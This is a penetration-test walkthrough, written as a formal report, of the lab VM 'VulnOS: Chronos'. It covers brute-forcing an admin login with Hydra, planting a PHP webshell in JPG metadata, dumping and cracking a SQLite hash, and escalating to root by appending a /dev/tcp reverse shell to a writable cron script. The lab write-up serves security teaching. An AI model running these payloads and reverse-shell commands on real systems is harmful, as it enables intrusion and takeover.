# VulnOS: Chronos - Penetration Test & Exploit Walkthrough

| :--- | :--- |
| **Document Title:** | VulnOS: Chronos - Penetration Test & Exploit Walkthrough |
| **Author:** | [Your Name/Handle] |
| **Date of Report:** | August 14, 2025 |
| **Target System:** | VulnOS: Chronos |
| **Target IP Address:** | `$TARGET_IP` |
| **Assessed Difficulty:**| Medium |

---

### 1. Executive Summary

This report details the successful penetration test of the virtual machine "VulnOS: Chronos." The objective, to gain initial access and escalate privileges to the root user, was fully achieved. The attack path involved a multi-stage compromise of a web application, followed by a pivot to an internal user account and a final privilege escalation via a misconfigured scheduled task.

Key vulnerabilities identified include information disclosure, username enumeration, weak password policies, an insecure file upload mechanism, and improper file permissions on a critical system script. This chain of vulnerabilities allowed a remote, unauthenticated attacker to gain complete administrative control over the target system. The full technical breakdown can be found in the [[4. Findings & Exploitation Narrative]] section.

---

### 2. Introduction & Scope

#### 2.1. Objective
The primary objective of this engagement was to perform a penetration test on the "VulnOS: Chronos" server to identify and exploit vulnerabilities, with the final goal of capturing two flags:
1.  **User Flag:** Located in the `/home/[REDACTED_USER]/` directory.
2.  **Root Flag:** Located in the `/root/` directory.

#### 2.2. Scope
The scope was limited to the single virtual machine, "VulnOS: Chronos," accessible at the IP address `$TARGET_IP`. No other network assets were targeted.

---

### 3. Methodology & Tools Used

#### 3.1. Methodology
The assessment followed a standard penetration testing methodology, encompassing the following phases:
- **Reconnaissance:** Scanning and enumeration of the target to identify services and potential attack vectors.
- **Initial Exploitation:** Gaining an initial low-privilege shell on the system.
- **Post-Exploitation & Privilege Escalation:** Enumerating the compromised system to pivot to other user accounts and ultimately gain root-level access.

#### 3.2. Tools Used
- Nmap
- cURL
- Hydra
- Exiftool
- Netcat
- SQLite3 CLI
- John the Ripper

---

### 4. Findings & Exploitation Narrative

This section provides a detailed, step-by-step narrative of the exploitation process.

#### 4.1. Initial Foothold: Web Application Compromise

**4.1.1. Service Enumeration**
> [!TIP] Nmap Scan
> An initial `nmap` scan of the target revealed two primary services:
> ```bash
> nmap -sV -p- $TARGET_IP
> ```

> [!INFO] Scan Results
> ```
> PORT   STATE SERVICE VERSION
> 22/tcp open  ssh     OpenSSH [...]
> 80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
> ```
> The web server on port 80 was identified as the primary attack surface.

**4.1.2. Username Discovery via Information Disclosure**
> [!TIP] Check `robots.txt`
> An examination of the `robots.txt` file revealed a disallowed entry pointing to a non-public page.
> ```bash
> curl http://$TARGET_IP/robots.txt
> ```

> [!INFO] `robots.txt` Contents
> ```
> User-agent: *
> Disallow: /assets/
> Disallow: /staff_portal.html
> ```
> Navigating to `http://$TARGET_IP/staff_portal.html` disclosed the username of the System Administrator.

> [!SUCCESS] Username Found
> - **User:** `[REDACTED_ADMIN_USER]`

**4.1.3. Authentication Bypass via Brute-Forcing**
The admin login portal at `admin_login.php` was found to be vulnerable to username enumeration. Using the confirmed username, a password brute-force attack was conducted with `Hydra`.

> [!TIP] Hydra Command
> ```bash
> hydra -l [REDACTED_ADMIN_USER] -P /path/to/chronos_list.txt $TARGET_IP http-post-form "/admin_login.php:username=^USER^&password=^PASS^:Incorrect Password"
> ```

> [!SUCCESS] Credentials Found
> - **User:** `[REDACTED_ADMIN_USER]`
> - **Password:** `[REDACTED_PASSWORD]`

**4.1.4. Remote Code Execution via Hardened File Upload Bypass**
After authenticating to the admin panel, a file upload form was discovered. The form was hardened to only accept valid image files. This was bypassed using a multi-step process:

> [!NOTE] Bypass Strategy
> 1. Create a polyglot file by injecting a PHP payload into a valid JPG's metadata using `exiftool`.
> 2. Rename the file to `shell.php.jpg` to exploit a server misconfiguration.
> 3. Upload the file and trigger the payload to gain a reverse shell.

> [!TIP] Create the Payload
> ```bash
> # Step 1: Inject PHP shell into image metadata
> exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
> 
> # Step 2: Rename the file for the exploit
> mv image.jpg shell.php.jpg
> ```

> [!TIP] Obtain Reverse Shell
> ```bash
> # Step 3: Start Netcat listener on attacker machine
> nc -lvnp 4444
> 
> # Step 4: Trigger the payload from another terminal
> curl -g "http://$TARGET_IP/uploads/shell.php.jpg?cmd=...[URL-Encoded Reverse Shell Payload]..."
> ```

> [!SUCCESS] Shell Obtained
> A reverse shell was obtained as the **`www-data`** user.

#### 4.2. User Pivot: `www-data` to a Standard User

**4.2.1. Internal Enumeration & Credential Discovery**
Enumeration of `/var/www/` revealed a database file at `/var/www/db/database.sqlite`.

**4.2.2. Password Cracking**
> [!TIP] Dump Database Contents
> ```bash
> sqlite3 /var/www/db/database.sqlite ".dump"
> ```

> [!INFO] Hash Found
> The database contained the MD5 hash for a user: `[REDACTED_MD5_HASH]`.

The hash was cracked using `John the Ripper`.

> [!SUCCESS] Credentials Found
> - **User:** `[REDACTED_USER]`
> - **Password:** `[REDACTED_USER_PASSWORD]`

**4.2.3. User Flag Acquisition**
> [!TIP] Switch User
> ```bash
> su [REDACTED_USER]
> # Password: [REDACTED_USER_PASSWORD]
> ```

> [!SUCCESS] User Flag Captured
> ```bash
> cat /home/[REDACTED_USER]/user.txt
> [REDACTED_USER_FLAG]
> ```

#### 4.3. Privilege Escalation: Standard User to `root`

**4.3.1. Discovery of Misconfigured Cron Job**
Enumeration of `cat /etc/crontab` revealed a script at `/opt/scripts/backup.sh` being executed by `root` every three minutes.

**4.3.2. Exploitation of Insecure File Permissions**
An inspection of the script's permissions (`ls -l`) revealed it was group-writable by the `devs` group. The `id` command confirmed that our current user was a member of this group.

**4.3.3. Root Flag Acquisition**
> [!TIP] Inject Payload and Start Listener
> ```bash
> # Start final listener on attacker machine
> nc -lvnp 5555
> 
> # From the user's shell, append the payload
> echo "bash -c 'bash -i >& /dev/tcp/YOUR_ATTACKER_IP/5555 0>&1'" >> /opt/scripts/backup.sh
> ```
> After waiting for the cron job to run, a root shell was obtained.

> [!SUCCESS] Root Flag Captured
> ```bash
> cat /root/root.txt
> [REDACTED_ROOT_FLAG]
> ```

---

### 5. Summary of Vulnerabilities

- **Information Disclosure:** `robots.txt` exposed a sensitive administration page.
- **Username Enumeration:** The login form provided distinct responses, allowing for the confirmation of valid usernames.
- **Weak Password Policy:** The admin account used a dictionary-word password susceptible to brute-forcing.
- **Insecure File Upload Controls:** The combination of metadata-based content validation and a server-side handler misconfiguration allowed for the upload and execution of a polyglot image shell.
- **Credential Storage:** A password hash was stored in an accessible SQLite database, allowing for offline cracking.
- **Insecure File Permissions on Scheduled Task:** A root-owned script executed by cron was group-writable, allowing a non-privileged user to inject and execute code as root.

---

### 6. Conclusion

The objectives of the penetration test were fully met. A complete compromise of the "VulnOS: Chronos" system was achieved by chaining multiple medium-severity vulnerabilities, demonstrating a realistic attack path from initial web reconnaissance to full root-level control.
